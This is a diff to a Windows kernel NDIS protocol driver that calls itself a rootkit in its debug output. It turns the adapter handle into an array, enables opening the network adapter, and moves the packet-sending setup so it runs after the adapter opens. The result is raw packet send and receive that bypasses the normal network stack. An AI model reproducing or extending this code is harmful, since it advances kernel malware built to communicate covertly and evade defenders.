@@ -339,7 +339,8 @@ nd_str             g_dev_prefix = NDIS_STRING_CONST("\\Device\\");
 dev_obj           *g_device;
 const wchar_t      g_devpath[] = L"\\Device\\myDevice1";     // Define the device
 const wchar_t      g_devlink[] = L"\\DosDevices\\myDevice1"; // Symlink for the device
-nd_hndl            g_iface_hndl;
+nd_hndl            g_iface_hndl[8];
+int                g_iface_indx = 0;
 nd_hndl            g_proto_hndl;
 nd_hndl            g_buffer_pool;
 nd_hndl            g_packet_pool;
@@ -413,7 +414,7 @@ void ndis_packet_send_orig(const uchar *packet, int len)
 	
 	/* aquire lock, release only when send is complete */
 	KeAcquireSpinLock(&g_splock, &g_irq);
-	if (g_iface_hndl && packet) {
+	if (g_iface_hndl[g_iface_indx] && packet) {
 		nd_pack *npacket;
 		NdisAllocatePacket(&ret, &npacket, g_packet_pool);
 		if (NDIS_STATUS_SUCCESS == ret) {
@@ -426,9 +427,9 @@ void ndis_packet_send_orig(const uchar *packet, int len)
 			if (NDIS_STATUS_SUCCESS == ret) {
 				RESERVED(npacket)->Irp = NULL; /* so our OnSendDone() knows this is local */
 				NdisChainBufferAtBack(npacket, nbuf);
-				NdisSend(&ret, g_iface_hndl, npacket);
+				NdisSend(&ret, g_iface_hndl[g_iface_indx], npacket);
 				if (ret != NDIS_STATUS_PENDING ) {
-					ndis_send(g_iface_hndl, npacket, ret);
+					ndis_send(g_iface_hndl[g_iface_indx], npacket, ret);
 				}
 			} else {
 				DbgPrint("rootkit: error 0x%X NdisAllocateBuffer\n");
@@ -452,7 +453,7 @@ void ndis_packet_send(const uchar *packet, int len)
 	
 	DBG_IN;
 	
-	if (!g_iface_hndl || !packet) {
+	if (!g_iface_hndl[g_iface_indx] || !packet) {
 		DBG_OUT_RV;
 	}
 	
@@ -472,9 +473,9 @@ void ndis_packet_send(const uchar *packet, int len)
 	
 	RSRVD_PCKT_CTX(npacket)->rp = NULL; /* so our OnSendDone() knows this is local */
 	NdisChainBufferAtBack(npacket, nbuf);
-	NdisSend(&ret, g_iface_hndl, npacket);
+	NdisSend(&ret, g_iface_hndl[g_iface_indx], npacket);
 	if (ret != NDIS_STATUS_PENDING ) {
-		ndis_send(g_iface_hndl, npacket, ret);
+		ndis_send(g_iface_hndl[g_iface_indx], npacket, ret);
 	}
 	
 	/* release so we can send next.. */
@@ -516,7 +517,7 @@ void ndis_iface_open(nd_hndl protobind_ctx, nd_ret s, nd_ret err)
 	ndis_req.DATA.SET_INFORMATION.InformationBuffer        =  &pcktype                      ;
 	ndis_req.DATA.SET_INFORMATION.InformationBufferLength  =  sizeof(ulong)                 ;
 	
-	NdisRequest(&ret_req, g_iface_hndl, &ndis_req);
+	NdisRequest(&ret_req, g_iface_hndl[g_iface_indx], &ndis_req);
 	
 	NdisAllocatePacketPool(&ret, &g_packet_pool, TRANSMIT_PACKETS, sizeof(struct packet_ctx));
 	RET_ON_ERR_MV_ND("NdisAllocatePacketPool: error", ret);
@@ -629,7 +630,7 @@ nt_ret ndis_recv(nd_hndl protobind_ctx, nd_hndl mac_ctx, void *hdr_buf, uint hdr
 					
 					/*this is important here we attach the buffer to the packet*/
 					NdisChainBufferAtFront(npacket, nbuf);
-					NdisTransferData(&(g_usrctx.status), g_iface_hndl, mac_ctx, 0, tx_size, npacket, &tx_bytes);
+					NdisTransferData(&(g_usrctx.status), g_iface_hndl[g_iface_indx], mac_ctx, 0, tx_size, npacket, &tx_bytes);
 					
 					if (ret != NDIS_STATUS_PENDING) {
 						/*important to call the complete routine since it's not pending*/
@@ -839,7 +840,7 @@ void init_ndis_device(wchar_t *iface_name, int iface_len)
 	
 	DBG_IN;
 	
-	printm("init global adapter name");
+	//printm("init global adapter name");
 	
 	DbgPrint("DEVICE(input  s) == %s\n",  iface_name);
 	DbgPrint("DEVICE(input ws) == %ws\n", iface_name);
@@ -858,6 +859,7 @@ void init_ndis_device(wchar_t *iface_name, int iface_len)
 	*/
 	
 	/* CHECK */
+	/*
 	printm("init local adapter name");
 	nt_init_ustring(&g_iface_name, iface_name);
 	
@@ -873,7 +875,8 @@ void init_ndis_device(wchar_t *iface_name, int iface_len)
 	DbgPrint("g dev path ws == %ws\n", g_devpath);
 	DbgPrint("g dev link  s ==  %s\n", g_devlink);
 	DbgPrint("g dev link ws == %ws\n", g_devlink);
-	
+	*/
+
 	/*
 	g_iface_name.Length = 0;
 	g_iface_name.MaximumLength = iface_len + g_dev_prefix.Length + sizeof(UNICODE_NULL);
@@ -919,13 +922,13 @@ void init_ndis_device(wchar_t *iface_name, int iface_len)
 	/*
 	DbgPrint("iface_name  s) ==  %s\n", iface_name);
 	DbgPrint("iface_name ws) == %ws\n", iface_name);
-	
+	*/
 	printm("init local adapter name");
 	nt_init_ustring(&ifname, iface_name);
 	
 	DbgPrint("ifname  s) ==  %s\n", ifname.Buffer);
 	DbgPrint("ifname ws) == %ws\n", ifname.Buffer);
-	*/
+	
 	
 	//nt_init_ustring(&ifname, L"\\Device\\{BDB421B0-4B37-4AA2-912B-3AA05F8A0829}");
 	//nt_init_ustring(&ifname, L"\\Device\\{2D2E989B-6153-4787-913D-807779793B27}");
@@ -934,9 +937,9 @@ void init_ndis_device(wchar_t *iface_name, int iface_len)
 	 * \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{...}
 	 */
 	
-	/*
+	
 	printm("opening adapter");
-	NdisOpenAdapter(&ret, &err, &g_iface_hndl, &mindex, &marray, 1, g_proto_hndl, &g_usrctx, &ifname, 0, NULL);
+	NdisOpenAdapter(&ret, &err, &g_iface_hndl[g_iface_indx], &mindex, &marray, 1, g_proto_hndl, &g_usrctx, &ifname, 0, NULL);
 	if (!(IS_ND_OK(ret))) {
 		if (!(IS_NT_OK(ret))) {
 			printmd("NdisOpenAdapter: error", ret);
@@ -953,7 +956,8 @@ void init_ndis_device(wchar_t *iface_name, int iface_len)
 	}
 	
 	ndis_iface_open(&g_usrctx, ret, ND_OK);
-	*/
+	
+	init_sending();
 }
 
 
@@ -1114,7 +1118,7 @@ void exit_ndis(mod_obj *mobj)
 	NdisResetEvent(&g_closew_event);
 	
 	printm("closing adapter");
-	NdisCloseAdapter(&ret, g_iface_hndl);
+	NdisCloseAdapter(&ret, g_iface_hndl[g_iface_indx]);
 	if (ret == NDIS_STATUS_PENDING) {
 		printm("waiting ndis event");
 		NdisWaitEvent(&g_closew_event, 0);
@@ -1188,8 +1192,6 @@ nt_ret init_module(mod_obj *mobj)
 	printm("init ndis");
 	ret = init_ndis(mobj);
 	RET_ON_ERR(ret);
-	
-	init_sending();
 	
 	DBG_OUT_RET(NT_OK);
 }
